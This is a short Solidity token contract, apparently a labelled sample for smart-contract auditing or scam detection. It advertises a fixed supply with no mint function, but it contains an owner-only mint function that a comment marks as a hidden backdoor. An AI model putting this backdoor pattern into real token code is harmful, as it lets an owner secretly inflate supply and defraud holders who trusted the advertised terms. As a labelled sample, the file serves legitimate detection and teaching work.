// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @notice Deceptive Community Token
 * Marketing Claim: "100% Community Owned, Fixed 1,000,000 Supply, No Mint Function, 0% Tax"
 */
contract DeceptiveHoneypot {
    string public name = "Deceptive Token";
    string public symbol = "DECEPT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        totalSupply = 1_000_000 * 10**18;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    // HIDDEN BACKDOOR: Contradicts the "No Mint / Fixed Supply" claim!
    function mint(address to, uint256 amount) public onlyOwner returns (bool) {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}
